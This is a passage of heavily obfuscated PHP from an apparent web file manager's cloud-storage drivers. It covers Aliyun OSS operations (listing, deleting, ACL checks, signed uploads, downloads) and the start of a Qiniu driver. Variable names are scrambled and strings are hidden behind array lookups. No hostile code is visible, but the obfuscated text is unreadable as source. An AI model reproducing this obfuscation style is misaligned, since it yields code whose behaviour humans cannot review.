$ÜÆÂ”ÍÏ) { return !1; } return !0; } public function delFolder($íû”‰) { $é£è¿Õä =& $_SERVER[§ŒØóıü]; if (!$this->exist($íû”‰)) { return !0; } $this->listItemCache = !1; $©›¨†Ñ­ = $this->fileList($íû”‰); $this->listItemCache = !0; $¤Ş»¡‡ˆ = trim($íû”‰, $é£è¿Õä[8]) . $é£è¿Õä[8]; if (!empty($íû”‰) && $íû”‰ !== $é£è¿Õä[198] && !in_array($¤Ş»¡‡ˆ, $©›¨†Ñ­[$é£è¿Õä[82]])) { $©›¨†Ñ­[$é£è¿Õä[82]][] = $¤Ş»¡‡ˆ; } $ËÛ®¯¢Û = $this->delByBatch($©›¨†Ñ­[$é£è¿Õä[83]]); if (!$ËÛ®¯¢Û) { return !1; } $ËÛ®¯¢Û = $this->delByBatch($©›¨†Ñ­[$é£è¿Õä[82]]); if (!$ËÛ®¯¢Û) { return !1; } return $this->delFile($¤Ş»¡‡ˆ); } private function delByBatch($Ç¶ô¯èµ) { foreach (array_chunk($Ç¶ô¯èµ, 1000) as $¨şÕ·’¯) { try { $this->client->deleteObjects($this->bucket, $¨şÕ·’¯); } catch (OSS\Core\OssException $¨ÎóÓ’ù) { return !1; } } return !0; } public function rename($Ñ¦¾ÊÆº, $–ëº­¶ ) { return $this->renameObject($Ñ¦¾ÊÆº, $–ëº­¶ ); } private function fileInfo($ïà¼ÜÅî, $¥éÔ·ê÷ = false, $¸¶Ê‚Àû = array()) { $óÛÈƒÒÃ =& $_SERVER[§ŒØóıü]; $µ‡§ = array($óÛÈƒÒÃ[32] => $this->pathThis($ïà¼ÜÅî), $óÛÈƒÒÃ[84] => $this->getPathOuter($ïà¼ÜÅî), $óÛÈƒÒÃ[33] => $óÛÈƒÒÃ[200], $óÛÈƒÒÃ[76] => isset($¸¶Ê‚Àû[$óÛÈƒÒÃ[76]]) ? $¸¶Ê‚Àû[$óÛÈƒÒÃ[76]] : 0, $óÛÈƒÒÃ[174] => $this->ext($ïà¼ÜÅî)); if ($¥éÔ·ê÷) { return $µ‡§; } $µ‡§[$óÛÈƒÒÃ[201]] = $µ‡§[$óÛÈƒÒÃ[85]] = 0; $µ‡§[$óÛÈƒÒÃ[202]] = $µ‡§[$óÛÈƒÒÃ[203]] = !0; if (empty($¸¶Ê‚Àû)) { $’ÍËÄò = $this->objectMeta($ïà¼ÜÅî); if (!$’ÍËÄò) { return $µ‡§; } $¸¶Ê‚Àû = array($óÛÈƒÒÃ[85] => strtotime($’ÍËÄò[$óÛÈƒÒÃ[1417]]), $óÛÈƒÒÃ[76] => $’ÍËÄò[$óÛÈƒÒÃ[1416]] + 0); } if (isset($¸¶Ê‚Àû[$óÛÈƒÒÃ[76]])) { $µ‡§[$óÛÈƒÒÃ[76]] = $¸¶Ê‚Àû[$óÛÈƒÒÃ[76]]; } if (isset($¸¶Ê‚Àû[$óÛÈƒÒÃ[85]])) { $µ‡§[$óÛÈƒÒÃ[85]] = $¸¶Ê‚Àû[$óÛÈƒÒÃ[85]]; } if (isset($¸¶Ê‚Àû[$óÛÈƒÒÃ[180]]) && !trim($µ‡§[$óÛÈƒÒÃ[85]])) { $µ‡§[$óÛÈƒÒÃ[85]] = $¸¶Ê‚Àû[$óÛÈƒÒÃ[180]]; } return $µ‡§; } private function folderInfo($íÖ‚à£—, $†®ÃØ = false, $ÎÄø¿šÜ = array()) { $¡½¥™¤‚ =& $_SERVER[§ŒØóıü]; $³ëÙÉ’Ï = array($¡½¥™¤‚[32] => $this->pathThis($íÖ‚à£—), $¡½¥™¤‚[84] => $this->getPathOuter($¡½¥™¤‚[8] . $íÖ‚à£—), $¡½¥™¤‚[33] => $¡½¥™¤‚[75]); if ($†®ÃØ) { return $³ëÙÉ’Ï; } $³ëÙÉ’Ï[$¡½¥™¤‚[201]] = $³ëÙÉ’Ï[$¡½¥™¤‚[85]] = 0; $³ëÙÉ’Ï[$¡½¥™¤‚[202]] = $³ëÙÉ’Ï[$¡½¥™¤‚[203]] = !0; if (empty($ÎÄø¿šÜ)) { $íÖ‚à£— = rtrim($íÖ‚à£—, $¡½¥™¤‚[8]) . $¡½¥™¤‚[8]; $®ñ¸ = $this->objectMeta($íÖ‚à£—); if (!$®ñ¸) { return $³ëÙÉ’Ï; } $ÎÄø¿šÜ = array($¡½¥™¤‚[201] => $®ñ¸[$¡½¥™¤‚[502]][$¡½¥™¤‚[1424]], $¡½¥™¤‚[85] => strtotime($®ñ¸[$¡½¥™¤‚[1417]])); } if (isset($ÎÄø¿šÜ[$¡½¥™¤‚[85]])) { $³ëÙÉ’Ï[$¡½¥™¤‚[85]] = $ÎÄø¿šÜ[$¡½¥™¤‚[85]]; } if (isset($ÎÄø¿šÜ[$¡½¥™¤‚[201]])) { $³ëÙÉ’Ï[$¡½¥™¤‚[201]] = $ÎÄø¿šÜ[$¡½¥™¤‚[201]]; } return $³ëÙÉ’Ï; } public function listPath($ôªì‡•á, $Õ¢»®Ù¢ = false) { $…§·’Ô± =& $_SERVER[§ŒØóıü]; $öŠÕîÍ = $this->fileList($ôªì‡•á, $…§·’Ô±[8], !0); foreach ($öŠÕîÍ[$…§·’Ô±[82]] as $û¿ä¤¶Ë => $†³îäù) { $öŠÕîÍ[$…§·’Ô±[82]][$û¿ä¤¶Ë] = $this->folderInfo($†³îäù, $Õ¢»®Ù¢, $†³îäù); } foreach ($öŠÕîÍ[$…§·’Ô±[83]] as $û¿ä¤¶Ë => $†³îäù) { $öŠÕîÍ[$…§·’Ô±[83]][$û¿ä¤¶Ë] = $this->fileInfo($†³îäù[$…§·’Ô±[32]], $Õ¢»®Ù¢, $†³îäù); } return $öŠÕîÍ; } protected function infoChildren($äæãÃØ, &$‚äšÎ¨) { $Úëüù™Á =& $_SERVER[§ŒØóıü]; $²èéÍæ = $this->fileList($äæãÃØ, $Úëüù™Á[12], !0); $‚äšÎ¨[$Úëüù™Á[78]] += count($²èéÍæ[$Úëüù™Á[82]]); $‚äšÎ¨[$Úëüù™Á[77]] += count($²èéÍæ[$Úëüù™Á[83]]); foreach ($²èéÍæ[$Úëüù™Á[83]] as $±†Ù¨·Ÿ) { if (!$±†Ù¨·Ÿ || !$±†Ù¨·Ÿ[$Úëüù™Á[76]]) { continue; } $‚äšÎ¨[$Úëüù™Á[76]] += $±†Ù¨·Ÿ[$Úëüù™Á[76]]; } } public function has($õàñûÄ, $ì¥ÓœÁ = false, $Á³Í‰Í = true) { $²’¶¦¿ =& $_SERVER[§ŒØóıü]; $õàñûÄ = trim($õàñûÄ, $²’¶¦¿[8]); $¸Ô•¼æŠ = empty($õàñûÄ) && $õàñûÄ !== $²’¶¦¿[198] ? $²’¶¦¿[12] : $õàñûÄ . $²’¶¦¿[8]; $á›Ğıˆ´ = $²’¶¦¿[12]; $”üñ¤Ø• = 500; $À™Ë±’¸ = $‡Ñ€ˆûœ = 0; while (!0) { check_abort(); $’ìÆÌºâ = array($²’¶¦¿[1412] => $²’¶¦¿[8], $²’¶¦¿[1413] => $¸Ô•¼æŠ, $²’¶¦¿[1414] => $”üñ¤Ø•, $²’¶¦¿[1415] => $á›Ğıˆ´); try { $½ÔÀ­€Ì = $this->client->listObjects($this->bucket, $’ìÆÌºâ); } catch (OSS\Core\OssException $ù•²Ïú) { break; } $á›Ğıˆ´ = $½ÔÀ­€Ì->getNextMarker(); $Ê¼ª–×· = $½ÔÀ­€Ì->getObjectList(); $í‚ºÃÎ· = $½ÔÀ­€Ì->getPrefixList(); if ($ì¥ÓœÁ) { if (count($Ê¼ª–×·) > 1 || count($Ê¼ª–×·) == 1 && $Ê¼ª–×·[0]->getKey() != $¸Ô•¼æŠ) { $À™Ë±’¸ += count($Ê¼ª–×·) - 1; } if (!empty($í‚ºÃÎ·)) { $‡Ñ€ˆûœ += count($í‚ºÃÎ·); } if ($á›Ğıˆ´ === $²’¶¦¿[12]) { break; } continue; } if ($Á³Í‰Í) { if (!empty($Ê¼ª–×·)) { if (count($Ê¼ª–×·) > 1 || $Ê¼ª–×·[0]->getKey() != $¸Ô•¼æŠ) { return !0; } } } else { if (!empty($í‚ºÃÎ·)) { return !0; } } if ($á›Ğıˆ´ === $²’¶¦¿[12]) { break; } } if ($ì¥ÓœÁ) { return array($²’¶¦¿[207] => $À™Ë±’¸, $²’¶¦¿[208] => $‡Ñ€ˆûœ); } return !1; } public function listAll($¨ïÓ”ÍÁ) { $úû—óš =& $_SERVER[§ŒØóıü]; $Ìö™°½˜ = $this->fileList($¨ïÓ”ÍÁ, $úû—óš[12], !0); $ëŸÍ©Ÿğ = array_to_keyvalue($Ìö™°½˜[$úû—óš[83]], $úû—óš[32]); foreach ($Ìö™°½˜[$úû—óš[82]] as $¸äå‚) { if (is_string($¸äå‚)) { $ëŸÍ©Ÿğ[$¸äå‚] = array($úû—óš[76] => 0); } } return $this->listAllFiles($¨ïÓ”ÍÁ, $ëŸÍ©Ÿğ); } public function canRead($°¹êØŒë) { $àğ¡÷—† =& $_SERVER[§ŒØóıü]; $À½¬‰ Æ = $this->pathAcl($°¹êØŒë); return $À½¬‰ Æ == $àğ¡÷—†[1425] || $À½¬‰ Æ == $àğ¡÷—†[547] ? !0 : !1; } public function canWrite($Ûƒ°ü) { $ëß›ĞÚ = $this->pathAcl($Ûƒ°ü); return $ëß›ĞÚ == $_SERVER[§ŒØóıü][547] ? !0 : !1; } public function pathAcl($ã¡á¾ÇÏ) { $œìˆá“Ù =& $_SERVER[§ŒØóıü]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $´¦åÏŸ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ã¡á¾ÇÏ)); } catch (OSS\Core\OssException $³Ø¢ù…ï) { return !1; } $‡½óÑª = $´¦åÏŸ == $œìˆá“Ù[37] ? $this->bucketAcl : $´¦åÏŸ; if ($‡½óÑª == $œìˆá“Ù[1426]) { return $œìˆá“Ù[1425]; } if ($‡½óÑª == $œìˆá“Ù[1427]) { return $œìˆá“Ù[547]; } return $‡½óÑª; } private function chmodPath($Ì§ÂîÀó, $İ“ı Øˆ = '') { $¾ÍÎæÂ² =& $_SERVER[§ŒØóıü]; $ÀúÁë Ÿ = empty($İ“ı Øˆ) ? $¾ÍÎæÂ²[1427] : $İ“ı Øˆ; $Ãš˜¬ Œ = array($¾ÍÎæÂ²[37], $¾ÍÎæÂ²[199], $¾ÍÎæÂ²[1426], $¾ÍÎæÂ²[1427]); if (!in_array($ÀúÁë Ÿ, $Ãš˜¬ Œ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ì§ÂîÀó), $ÀúÁë Ÿ); } catch (OSS\Core\OssException $°Å…âÏ) { return !1; } return !0; } public function getContent($ß’çÓıÊ) { return $this->fileSubstr($ß’çÓıÊ, -1); } public function setContent($¯ı•‹ß‰, $Ş¬É—÷Í = '') { $æàö¯²€ =& $_SERVER[§ŒØóıü]; try { $¦¦”ÁÍï = $this->trafficLimit($æàö¯²€[1428]); $ÏÑ†ºß¢ = $this->client->putObject($this->bucket, $this->pathEncode($¯ı•‹ß‰), $Ş¬É—÷Í, $¦¦”ÁÍï); } catch (OSS\Core\OssException $÷„—Í‘Ï) { return !1; } $ıßùí°ø = array($æàö¯²€[1418] => trim($ÏÑ†ºß¢[$æàö¯²€[1429]], $æàö¯²€[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¯ı•‹ß‰))); $this->updateObjMeta($¯ı•‹ß‰, $ıßùí°ø); return isset($ÏÑ†ºß¢[$æàö¯²€[1430]][$æàö¯²€[1377]]) ? !0 : !1; } private function updateObjMeta($ùªØÆşÁ, $à“ö˜±®) { $ùªØÆşÁ = $this->pathEncode($ùªØÆşÁ); try { $ßöäÆú¯ = array(OSS\OssClient::OSS_HEADERS => $à“ö˜±®); $this->client->copyObject($this->bucket, $ùªØÆşÁ, $this->bucket, $ùªØÆşÁ, $ßöäÆú¯); } catch (OSS\Core\OssException $ß« ø–) { return !1; } return !0; } public function upload($¡°¶Úã‘, $«ó¦…¿´, $şÔƒşøı = false, $©¼ß›Ø = REPEAT_REPLACE) { $Â§¯Ÿèù =& $_SERVER[§ŒØóıü]; $Ş…áì˜Ñ = trim($¡°¶Úã‘, $Â§¯Ÿèù[8]); $ÏÉ…Š– = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Â§¯Ÿèù[1418] => @md5_file($«ó¦…¿´)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¡°¶Úã‘))); $ÏÉ…Š– = $this->trafficLimit($Â§¯Ÿèù[1428], $ÏÉ…Š–); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ş…áì˜Ñ), $«ó¦…¿´, $ÏÉ…Š–); } catch (OSS\Core\OssException $»õõš) { return !1; } return $this->getPathOuter($¡°¶Úã‘); } public function getHost() { $½çÓš´ë =& $_SERVER[§ŒØóıü]; $ˆ¡À¡îã = explode($½çÓš´ë[184], parent::getHost()); return $ˆ¡À¡îã[0] . $½çÓš´ë[184] . $this->bucket . $½çÓš´ë[10] . $ˆ¡À¡îã[1]; } public function uploadFormData($Ä‹Šš‹õ, $õ¹€«… = 3600) { $‹»ÊøØø =& $_SERVER[§ŒØóıü]; if (!($ë®¡şŠÒ = $this->getHost())) { return !1; } $Îäò±ï¥ = $õ¹€«…; $ÚÂÓú©ß = date($‹»ÊøØø[1431], time() + $Îäò±ï¥); $àøğ¹¡Õ = new DateTime($ÚÂÓú©ß); $Óñ§—Ñö = $àøğ¹¡Õ->format(DateTime::ISO8601); $±Çõ¡£­ = strpos($Óñ§—Ñö, $‹»ÊøØø[296]); $Óñ§—Ñö = substr($Óñ§—Ñö, 0, $±Çõ¡£­) . $‹»ÊøØø[1432]; $ûÏÏ©Ó— = 1048576000 * 5; $Œ°½´å = $this->pathFather($Ä‹Šš‹õ); $¼ù’ŒĞè = array($‹»ÊøØø[1330] => $Óñ§—Ñö, $‹»ÊøØø[1331] => array(array($‹»ÊøØø[1433], 0, $ûÏÏ©Ó—), array($‹»ÊøØø[1334], $‹»ÊøØø[1335], $Œ°½´å))); $Ÿ©²ÉÛş = base64_encode(json_encode($¼ù’ŒĞè)); $ß½•íèË = base64_encode(hash_hmac($‹»ÊøØø[232], $Ÿ©²ÉÛş, $this->secret, !0)); $”‚Ò«˜Å = array($‹»ÊøØø[1340] => $Ÿ©²ÉÛş, $‹»ÊøØø[1434] => $this->accessKey, $‹»ÊøØø[1336] => $‹»ÊøØø[1328], $‹»ÊøØø[1435] => $ß½•íèË, $‹»ÊøØø[182] => $ë®¡şŠÒ); $”‚Ò«˜Å = $this->trafficLimit($‹»ÊøØø[1428], $”‚Ò«˜Å); return $”‚Ò«˜Å; } public function multiUploadFormData($È´œûà, $¸»İıÄ = 3600) { $´ëáœ×Ú =& $_SERVER[§ŒØóıü]; if (!($ĞßÀû˜² = $this->getHost())) { return !1; } $›«µèï = $this->trafficLimit($´ëáœ×Ú[1428]); $ù°ŞàÚ€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($È´œûà), $›«µèï); return array($´ëáœ×Ú[223] => $ù°ŞàÚ€, $´ëáœ×Ú[182] => $ĞßÀû˜² . $´ëáœ×Ú[8] . $this->pathEncode($È´œûà), $´ëáœ×Ú[224] => gmdate($´ëáœ×Ú[1436]), $´ëáœ×Ú[94] => $È´œûà); } public function multiUploadAuthData($Êñ¤í‰•, $ŸáÂö¿å = array()) { $†ÄçãÇ =& $_SERVER[§ŒØóıü]; $ŒÔ¿ü°à = isset($ŸáÂö¿å[$†ÄçãÇ[224]]) ? $ŸáÂö¿å[$†ÄçãÇ[224]] : gmdate($†ÄçãÇ[1436]); $şîã÷‰Š = isset($ŸáÂö¿å[$†ÄçãÇ[174]]) ? $ŸáÂö¿å[$†ÄçãÇ[174]] : $†ÄçãÇ[12]; $êõñº¶¿ = $Êñ¤í‰•; if (isset($ŸáÂö¿å[$†ÄçãÇ[94]])) { $êõñº¶¿ = $ŸáÂö¿å[$†ÄçãÇ[94]]; unset($ŸáÂö¿å[$†ÄçãÇ[94]]); } if (isset($ŸáÂö¿å[$†ÄçãÇ[225]])) { $ŸáÂö¿å[$†ÄçãÇ[224]] = $ŒÔ¿ü°à; return $this->listUploadParts($êõñº¶¿, $ŸáÂö¿å); } $èğ–àæ = array($†ÄçãÇ[226], $†ÄçãÇ[12], $†ÄçãÇ[120], $ŒÔ¿ü°à, "\x78\55\157\163\163\x2d\144\x61\164\145\72{$ŒÔ¿ü°à}", $†ÄçãÇ[8] . $this->bucket . $†ÄçãÇ[8] . $êõñº¶¿ . $şîã÷‰Š); if (strpos($şîã÷‰Š, $†ÄçãÇ[227]) === 0) { $èğ–àæ[0] = $†ÄçãÇ[228]; if ($”ÇòÏı÷ = $this->trafficLimit($†ÄçãÇ[1428])) { $êõñº¶¿ = $†ÄçãÇ[1437]; array_splice($èğ–àæ, 5, 0, $êõñº¶¿ . $†ÄçãÇ[4] . $”ÇòÏı÷[$êõñº¶¿]); } } if (isset($ŸáÂö¿å[$†ÄçãÇ[229]]) && $ŸáÂö¿å[$†ÄçãÇ[229]] == $†ÄçãÇ[230]) { $èğ–àæ[0] = $†ÄçãÇ[230]; } if (!empty($ŸáÂö¿å[$†ÄçãÇ[1438]])) { $ÖÑšÊ¼ã = array_merge(array($èğ–àæ[4]), $ŸáÂö¿å[$†ÄçãÇ[1438]]); sort($ÖÑšÊ¼ã); $èğ–àæ[4] = implode($†ÄçãÇ[231], $ÖÑšÊ¼ã); } $«Æ•‡©Š = implode($†ÄçãÇ[231], $èğ–àæ); $õ·ûø©™ = base64_encode(hash_hmac($†ÄçãÇ[232], $«Æ•‡©Š, $this->secret, !0)); $ÕŒïçüä = $†ÄçãÇ[1402] . $this->accessKey . $†ÄçãÇ[4] . $õ·ûø©™; if (strpos($şîã÷‰Š, $†ÄçãÇ[227]) === 0) { $ÕŒïçüä = array($†ÄçãÇ[234] => $ÕŒïçüä, $†ÄçãÇ[224] => $ŒÔ¿ü°à); if ($”ÇòÏı÷) { $ÕŒïçüä = array_merge($ÕŒïçüä, $”ÇòÏı÷); } } return $ÕŒïçüä; } public function listUploadParts($ê†¤í¡„, $Òé˜®¬°) { $ıŒàèıâ =& $_SERVER[§ŒØóıü]; $ú©ôˆ“ä = parse_url_query($Òé˜®¬°[$ıŒàèıâ[174]]); $Õ˜ê»£ = $this->client->listParts($this->bucket, $this->pathEncode($ê†¤í¡„), $ú©ôˆ“ä[$ıŒàèıâ[223]]); $ßÛâŸ¯Á = $Õ˜ê»£->getListPart(); $’±²ôÅÔ = array(); foreach ($ßÛâŸ¯Á as $ØäÄıÂ½) { $’±²ôÅÔ[] = array($ıŒàèıâ[1422] => $ØäÄıÂ½->getPartNumber(), $ıŒàèıâ[1423] => trim($ØäÄıÂ½->getETag(), $ıŒàèıâ[118])); } unset($Òé˜®¬°[$ıŒàèıâ[225]], $Òé˜®¬°[$ıŒàèıâ[229]]); $Š”ÔèŸß = $this->multiUploadAuthData($ê†¤í¡„, $Òé˜®¬°); if (empty($Š”ÔèŸß)) { return !1; } return array($ıŒàèıâ[234] => $Š”ÔèŸß, $ıŒàèıâ[224] => $Òé˜®¬°[$ıŒàèıâ[224]], $ıŒàèıâ[236] => $’±²ôÅÔ); } public function download($é”¢¡ Ï, $‹ù¾äæ) { if ($this->isFolder($é”¢¡ Ï)) { return !1; } try { $¥´™„ŠÆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $‹ù¾äæ); $¥´™„ŠÆ = $this->trafficLimit($_SERVER[§ŒØóıü][109], $¥´™„ŠÆ); $this->client->getObject($this->bucket, $this->pathEncode($é”¢¡ Ï), $¥´™„ŠÆ); } catch (OSS\Core\OssException $¬ì½’èª) { return !1; } return $‹ù¾äæ; } public function fileSubstr($‹¢÷»©µ, $å™Ô¨¡Ù = 0, $øíÖ = false) { if ($å™Ô¨¡Ù === -1) { $†€ß‘ˆ¥ = array(); } else { if ($øíÖ === !1) { $ÉöóÚÃ» = $this->size($‹¢÷»©µ); } else { $ÉöóÚÃ» = $å™Ô¨¡Ù + $øíÖ - 1; } $†€ß‘ˆ¥ = array(OSS\OssClient::OSS_RANGE => "{$å™Ô¨¡Ù}\x2d{$ÉöóÚÃ»}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($‹¢÷»©µ), $†€ß‘ˆ¥); } catch (OSS\Core\OssException $ÑĞ—Åì) { think_exception($ÑĞ—Åì->getMessage()); return !1; } } private function trafficLimit($Ó ÜÁ®, $ã„·çŠå = array()) { $¨ùŒŞŞç =& $_SERVER[§ŒØóıü]; if ($Ó ÜÁ® == $¨ùŒŞŞç[1428] && $this->isUploadServer() || $Ó ÜÁ® == $¨ùŒŞŞç[109] && $this->isFileOutServer()) { return $ã„·çŠå; } $Ş â™­ = floatval($GLOBALS[$¨ùŒŞŞç[6]][$¨ùŒŞŞç[89]][$¨ùŒŞŞç[107]][$Ó ÜÁ®]) * 1024 * 1024 * 8; if (!$Ş â™­) { return $ã„·çŠå; } $Ş â™­ = $Ş â™­ < 819200 ? 819200 : ($Ş â™­ > 838860800 ? 838860800 : $Ş â™­); $ã„·çŠå[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ş â™­); return $ã„·çŠå; } public function link($ÌªÅÀœÒ, $ü¡ÅÜÑ“ = array()) { $ºÇØáÂà =& $_SERVER[§ŒØóıü]; if (!$this->exist($ÌªÅÀœÒ) || $this->isFolder($ÌªÅÀœÒ)) { return !1; } try { $ü¡ÅÜÑ“ = $this->trafficLimit($ºÇØáÂà[109], $ü¡ÅÜÑ“); $÷ †—ïœ = $this->client->signUrl($this->bucket, $this->pathEncode($ÌªÅÀœÒ), 3600 * 12, $ºÇØáÂà[230], $ü¡ÅÜÑ“); return $this->getCdnLink($÷ †—ïœ); } catch (OSS\Core\OssException $¥ ŒñÆÂ) { return !1; } } public function fileOut($ÒÒ»†Œü, $ƒà½¸ËÛ = false, $Ã¥û†Äí = false, $µ“ºëÊ” = '') { $üàÄ ¿ =& $_SERVER[§ŒØóıü]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÒÒ»†Œü, $ƒà½¸ËÛ, $Ã¥û†Äí, $µ“ºëÊ”); } if (!$Ã¥û†Äí) { $Ã¥û†Äí = $this->pathThis($ÒÒ»†Œü); } $Ã¥û†Äí = rawurlencode($Ã¥û†Äí); $•ÒÊéõ = get_file_mime(get_path_ext($Ã¥û†Äí)); if ($•ÒÊéõ == $üàÄ ¿[217]) { return parent::fileOut($ÒÒ»†Œü, $ƒà½¸ËÛ, $Ã¥û†Äí, $µ“ºëÊ”); } $ƒà½¸ËÛ = $ƒà½¸ËÛ ? $üàÄ ¿[1439] : $üàÄ ¿[1440]; $Ô›§¥£Ó = array(OSS\OssClient::OSS_SUB_RESOURCE => $üàÄ ¿[1441] . rawurlencode("{$ƒà½¸ËÛ}\73\x66\x69\x6c\x65\156\141\x6d\x65\x3d{$Ã¥û†Äí}")); $Ô›§¥£Ó[OSS\OssClient::OSS_SUB_RESOURCE] .= $üàÄ ¿[1442] . rawurlencode($•ÒÊéõ); $¼Ì¿¥¸… = $this->link($ÒÒ»†Œü, $Ô›§¥£Ó); $this->fileOutLink($¼Ì¿¥¸…); } public function fileOutServer($šùÙÑßÕ, $ëùÕø×ı = false, $ò±¥»ÙË = false, $…˜¢˜• = '') { parent::fileOut($šùÙÑßÕ, $ëùÕø×ı, $ò±¥»ÙË, $…˜¢˜•); } public function fileOutImage($±¯¨¨Ë°, $³…âû¯¦ = 250) { $ÎÖ®Êıò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[§ŒØóıü][1443] . $³…âû¯¦); $®àğ¢ÈĞ = $this->link($±¯¨¨Ë°, $ÎÖ®Êıò); $this->fileOutLink($®àğ¢ÈĞ); } public function fileOutImageServer($Äöùüıù, $åìƒ×è« = 250) { parent::fileOutImage($Äöùüıù, $åìƒ×è«); } public function fileOutLink($£·É­Ğú) { $Ë“†…Îµ =& $_SERVER[§ŒØóıü]; if (!$this->isCdnHost() && substr($£·É­Ğú, 0, 7) == $Ë“†…Îµ[1343]) { $£·É­Ğú = $Ë“†…Îµ[1344] . substr($£·É­Ğú, 7); } header($Ë“†…Îµ[161] . $£·É­Ğú); die; } public function hashMd5($‡ÆÉ’¹ü, $ÖÍœ¼¾´ = '') { $ö˜„ãŸé =& $_SERVER[§ŒØóıü]; $ĞÂôÈÃµ = $this->_objectMeta($‡ÆÉ’¹ü); if (!$ĞÂôÈÃµ) { return $ö˜„ãŸé[12]; } if (!isset($ĞÂôÈÃµ[$ö˜„ãŸé[1418]]) && !empty($ÖÍœ¼¾´)) { $»‹ë¯¥ = $this->updateObjMeta($‡ÆÉ’¹ü, array($ö˜„ãŸé[1418] => $ÖÍœ¼¾´)); $ĞÂôÈÃµ[$ö˜„ãŸé[1418]] = $»‹ë¯¥ ? $ÖÍœ¼¾´ : $ö˜„ãŸé[12]; } return isset($ĞÂôÈÃµ[$ö˜„ãŸé[1418]]) ? strtolower($ĞÂôÈÃµ[$ö˜„ãŸé[1418]]) : $ö˜„ãŸé[12]; } public function size($®ÉıË‹) { $¦åŞß¹™ = $this->objectMeta($®ÉıË‹); return $¦åŞß¹™ ? $¦åŞß¹™[$_SERVER[§ŒØóıü][76]] : 0; } public function info($ª·ó®É) { if ($this->isFolder($ª·ó®É)) { return $this->folderInfo($ª·ó®É); } else { if ($this->isFile($ª·ó®É)) { return $this->fileInfo($ª·ó®É); } } return !1; } public function exist($Ûãä) { return $this->isFile($Ûãä) || $this->isFolder($Ûãä); } public function isFile($Òâ£¬¢„) { return !$this->isFolder($Òâ£¬¢„) && $this->objectMeta($Òâ£¬¢„); } public function isFolder($ØÅá¼«) { return $this->cacheMethod($_SERVER[§ŒØóıü][165], $ØÅá¼«); } protected function objectMeta($£Œ«ºŞ) { return $this->cacheMethod($_SERVER[§ŒØóıü][167], $£Œ«ºŞ); } protected function _objectMeta($ÕÏÓ­Ãâ) { $Òš™ÓãØ =& $_SERVER[§ŒØóıü]; try { $Øó–÷Ş = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÕÏÓ­Ãâ)); } catch (OSS\Core\OssException $ÑƒêÜı¬) { $Øó–÷Ş = !1; } if ($Øó–÷Ş) { $Øó–÷Ş[$Òš™ÓãØ[76]] = intval($Øó–÷Ş[$Òš™ÓãØ[1416]]); } return $Øó–÷Ş; } protected function _isFolder($í˜«²‡) { $šñœìã½ =& $_SERVER[§ŒØóıü]; if ($í˜«²‡ == $šñœìã½[12] || $í˜«²‡ == $šñœìã½[8]) { return !0; } $ã„ÆÇ­² = array($šñœìã½[1412] => $šñœìã½[8], $šñœìã½[1413] => rtrim($í˜«²‡, $šñœìã½[8]) . $šñœìã½[8], $šñœìã½[1414] => 1, $šñœìã½[1415] => $šñœìã½[12]); $®Äá¶ï· = $this->client->listObjects($this->bucket, $ã„ÆÇ­²); if ($®Äá¶ï·->getObjectList() || $®Äá¶ï·->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¿ŒÔåÃá) { parent::__construct(); require_once SDK_DIR . $_SERVER[§ŒØóıü][1444]; $this->_init($¿ŒÔåÃá); } public function _init($×õ“ëÚú) { $Ú­ €ñ =& $_SERVER[§ŒØóıü]; $this->config = $×õ“ëÚú; foreach ($×õ“ëÚú as $»„¤ëä => $¸Ãì×ë£) { if (isset($this->{$»„¤ëä})) { $this->{$»„¤ëä} = $¸Ãì×ë£; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ú­ €ñ[1445] . LNG($Ú­ €ñ[1403])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ù¿—ó¸Ğ, $£Â¨ƒÛÔ = '', $âúŸú = REPEAT_RENAME) { if ($this->setContent($Ù¿—ó¸Ğ, $£Â¨ƒÛÔ)) { return $this->getPathOuter($Ù¿—ó¸Ğ); } return !1; } public function mkdir($ë™Ï­½Ÿ, $ª¤×«¤ú = REPEAT_SKIP) { $İŞ÷ÉÌ… =& $_SERVER[§ŒØóıü]; $œóÄÚ’ = trim($ë™Ï­½Ÿ, $İŞ÷ÉÌ…[8]); if ($this->_isFolder($œóÄÚ’)) { return $this->getPathOuter($œóÄÚ’); } $ë™Ï­½Ÿ = $œóÄÚ’ . $İŞ÷ÉÌ…[8]; $ë©®¥ç = get_path_this($œóÄÚ’); $Û´éÀö = $ë™Ï­½Ÿ . $ë©®¥ç; if (!$this->mkfile($Û´éÀö)) { return !1; } if (!$this->moveFile($Û´éÀö, $ë™Ï­½Ÿ)) { $this->delFile($Û´éÀö); return !1; } return $this->getPathOuter($œóÄÚ’); } public function copyFile($ƒ¿Ï¡¢á, $¿–ÕãÌı) { $Ïü³ùË¦ = $this->bucketManager->copy($this->bucket, $ƒ¿Ï¡¢á, $this->bucket, $¿–ÕãÌı, !0); return $Ïü³ùË¦ ? !1 : $this->getPathOuter($¿–ÕãÌı); } public function moveFile($ãºü‘, $±¼‘Ñ¡Í) { $°ƒÍõá† = $this->bucketManager->move($this->bucket, $ãºü‘, 